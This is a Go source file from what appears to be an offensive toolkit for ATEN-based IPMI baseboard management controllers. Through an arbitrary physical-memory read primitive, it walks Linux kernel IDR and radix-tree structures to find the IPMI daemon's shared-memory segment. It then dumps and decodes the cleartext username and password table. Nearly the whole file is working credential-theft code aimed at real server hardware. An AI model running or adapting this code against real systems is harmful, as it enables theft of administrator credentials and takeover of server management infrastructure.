package ipmi

// SysV shared-memory locate over the physical read primitive.
//
// The ATEN IPMI daemon keeps its live configuration - including the cleartext
// user/name+password table - in a SysV shared-memory segment attached with
// shmat(id, NULL, 0), so the segment has no fixed physical address and its pages
// are scattered across DRAM. This walks the kernel's shmem page-cache (a small,
// deterministic pointer chase over the physical read primitive) to translate a
// segment offset to a physical DRAM address, then reads it. The result is a
// direct in-DRAM dump of the cleartext credential table - a shortcut past the
// flash JFFS2 walk + AES decrypt that the offline credential-recovery path needs.
//
// The pinned kernel/build constants are Linux-version and libipmi-build specific;
// they live in MemProfile.ShmWalk and are filled only where verified live.

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"strings"
)

// ShmWalk carries the constants for the shmem page-cache walk. All addresses are
// kernel-physical; struct offsets are byte offsets within their structures.
type ShmWalk struct {
	MemMapPtr uint64 // &mem_map (physical); its value is read once at runtime
	IdrTop    uint64 // ipcs_idr.top pointer (physical)
	IdrLayers uint64 // ipcs_idr.layers (physical)

	IdrAry      uint64 // idr_layer.ary[]
	KeyOff      uint64 // kern_ipc_perm.key
	ShmFileOff  uint64 // shmid_kernel.shm_file
	FInodeOff   uint64 // file.f_inode
	IMappingOff uint64 // inode.i_mapping
	PtHeightOff uint64 // address_space.page_tree.height
	PtRnodeOff  uint64 // address_space.page_tree.rnode
	RtSlotsOff  uint64 // radix_tree_node.slots[]

	StructPage uint64 // sizeof(struct page)
	ArchPfnOff uint64 // ARCH_PFN_OFFSET (PHYS_OFFSET >> 12)
	Lowmem     uint64 // PAGE_OFFSET - PHYS_OFFSET (lowmem virt -> phys)
	RadixShift uint   // RADIX_TREE_MAP_SHIFT

	// GlobalVar credential table (segment offsets), if known for this build.
	GVKey       uint32 // shm key of the GlobalVar segment
	UserBase    uint64 // segment offset of slot 0
	UserStride  uint64 // bytes per record
	UserNameLen int    // username field length
	UserPwOff   uint64 // cleartext-password field offset within a record
	UserPwLen   int    // cleartext-password field length
	UserSlots   int    // number of records
}

func (w *ShmWalk) v2p(v uint32) uint64 { return uint64(v) - w.Lowmem }

// ShmSegLoc is a resolved segment: enough to translate any segment offset.
type ShmSegLoc struct {
	Key    uint32 `json:"key"`
	Height uint32 `json:"height"`
	Rnode  uint32 `json:"-"`
	MemMap uint32 `json:"-"`
	Shp    uint32 `json:"shmidKernel"`
}

// ShmUserRecord is one decoded credential-table slot.
type ShmUserRecord struct {
	Slot     int    `json:"slot"`
	Name     string `json:"name"`
	Password string `json:"password"`
}

func (s *CmdSess) shmRd32(p *MemProfile, phys uint64) (uint32, error) {
	d, cc, err := s.MemReadUnitAt(p, phys, 4)
	if err != nil {
		return 0, err
	}
	if cc != 0x00 || len(d) < 4 {
		return 0, fmt.Errorf("read at 0x%08x cc=0x%02x", phys, cc)
	}
	return binary.LittleEndian.Uint32(d), nil
}

// MemShmLocate resolves the SysV shm segment with the given key.
func (s *CmdSess) MemShmLocate(p *MemProfile, key uint32) (*ShmSegLoc, error) {
	w := p.ShmWalk
	if w == nil {
		return nil, fmt.Errorf("profile %s has no shm-walk parameters (kernel/build specific; only pinned where verified live)", p.ID)
	}
	memmap, err := s.shmRd32(p, w.MemMapPtr)
	if err != nil {
		return nil, fmt.Errorf("mem_map read: %w", err)
	}
	top, err := s.shmRd32(p, w.IdrTop)
	if err != nil {
		return nil, fmt.Errorf("ipcs_idr.top read: %w", err)
	}
	layers, err := s.shmRd32(p, w.IdrLayers)
	if err != nil {
		return nil, fmt.Errorf("ipcs_idr.layers read: %w", err)
	}
	// descend interior idr layers along index 0, then scan the leaf's ary[] for
	// the shmid_kernel whose kern_ipc_perm.key matches (do not assume index 0).
	leaf := top
	for i := uint32(0); i+1 < layers; i++ {
		leaf, err = s.shmRd32(p, w.v2p(leaf)+w.IdrAry)
		if err != nil {
			return nil, fmt.Errorf("idr interior descent: %w", err)
		}
	}
	var shp uint32
	for i := 0; i < 256; i++ {
		cand, e := s.shmRd32(p, w.v2p(leaf)+w.IdrAry+uint64(i)*4)
		if e != nil || cand == 0 {
			continue
		}
		if k, e := s.shmRd32(p, w.v2p(cand)+w.KeyOff); e == nil && k == key {
			shp = cand
			break
		}
	}
	if shp == 0 {
		return nil, fmt.Errorf("no SysV shm segment with key 0x%x found in the idr", key)
	}
	f, err := s.shmRd32(p, w.v2p(shp)+w.ShmFileOff)
	if err != nil {
		return nil, err
	}
	ino, err := s.shmRd32(p, w.v2p(f)+w.FInodeOff)
	if err != nil {
		return nil, err
	}
	mapping, err := s.shmRd32(p, w.v2p(ino)+w.IMappingOff)
	if err != nil {
		return nil, err
	}
	h, err := s.shmRd32(p, w.v2p(mapping)+w.PtHeightOff)
	if err != nil {
		return nil, err
	}
	rnode, err := s.shmRd32(p, w.v2p(mapping)+w.PtRnodeOff)
	if err != nil {
		return nil, err
	}
	return &ShmSegLoc{Key: key, Height: h, Rnode: rnode, MemMap: memmap, Shp: shp}, nil
}

// segPhys translates a segment offset to a physical DRAM address.
func (s *CmdSess) segPhys(p *MemProfile, loc *ShmSegLoc, off uint64) (uint64, error) {
	w := p.ShmWalk
	pgoff := off >> 12
	node := loc.Rnode &^ 3
	mask := uint64((1 << w.RadixShift) - 1)
	shift := int(w.RadixShift) * (int(loc.Height) - 1)
	for i := uint32(0); i < loc.Height; i++ {
		slot := (pgoff >> uint(shift)) & mask
		n, err := s.shmRd32(p, w.v2p(node)+w.RtSlotsOff+slot*4)
		if err != nil {
			return 0, err
		}
		if n == 0 {
			return 0, fmt.Errorf("segment offset 0x%x: page not faulted in", off)
		}
		node = n
		shift -= int(w.RadixShift)
	}
	pfn := (uint64(node)-uint64(loc.MemMap))/w.StructPage + w.ArchPfnOff
	return (pfn << 12) | (off & 0xFFF), nil
}

// MemReadShmSeg reads length bytes at a segment offset, resolving each 4 KB page
// separately (segment pages are not physically contiguous).
func (s *CmdSess) MemReadShmSeg(ctx context.Context, p *MemProfile, loc *ShmSegLoc, off uint64, length int) ([]byte, error) {
	if length <= 0 {
		return nil, fmt.Errorf("length must be positive")
	}
	out := make([]byte, 0, length)
	end := off + uint64(length)
	for cur := off; cur < end; {
		pageBase := cur &^ 0xFFF
		inPage := cur & 0xFFF
		n := int(0x1000 - inPage)
		if n > int(end-cur) {
			n = int(end - cur)
		}
		phys, err := s.segPhys(p, loc, pageBase)
		if err != nil {
			return nil, err
		}
		data, _, _, err := s.MemReadPhysical(ctx, p, phys+inPage, n, MemReadOptions{Unit: 4})
		if err != nil {
			return nil, err
		}
		out = append(out, data...)
		cur += uint64(n)
	}
	return out, nil
}

// MemDumpGlobalVarUsers locates the GlobalVar shm segment and reads the cleartext
// user/name+password table out of DRAM. Returns the resolved segment, the decoded
// non-empty records, and the raw table bytes.
func (s *CmdSess) MemDumpGlobalVarUsers(ctx context.Context, p *MemProfile) (*ShmSegLoc, []ShmUserRecord, []byte, error) {
	w := p.ShmWalk
	if w == nil || w.GVKey == 0 || w.UserStride == 0 {
		return nil, nil, nil, fmt.Errorf("profile %s has no GlobalVar credential-table parameters", p.ID)
	}
	loc, err := s.MemShmLocate(p, w.GVKey)
	if err != nil {
		return nil, nil, nil, err
	}
	raw, err := s.MemReadShmSeg(ctx, p, loc, w.UserBase, int(w.UserStride)*w.UserSlots)
	if err != nil {
		return loc, nil, nil, err
	}
	var recs []ShmUserRecord
	for i := 0; i < w.UserSlots; i++ {
		b := uint64(i) * w.UserStride
		if b+w.UserPwOff+uint64(w.UserPwLen) > uint64(len(raw)) {
			break
		}
		name := shmCStr(raw[b : b+uint64(w.UserNameLen)])
		pw := shmCStr(raw[b+w.UserPwOff : b+w.UserPwOff+uint64(w.UserPwLen)])
		if name == "" && pw == "" {
			continue
		}
		recs = append(recs, ShmUserRecord{Slot: i, Name: name, Password: pw})
	}
	return loc, recs, raw, nil
}

// shmCStr trims at the first NUL and keeps only printable ASCII.
func shmCStr(b []byte) string {
	if i := bytes.IndexByte(b, 0); i >= 0 {
		b = b[:i]
	}
	return strings.Map(func(r rune) rune {
		if r < 32 || r > 126 {
			return -1
		}
		return r
	}, string(b))
}
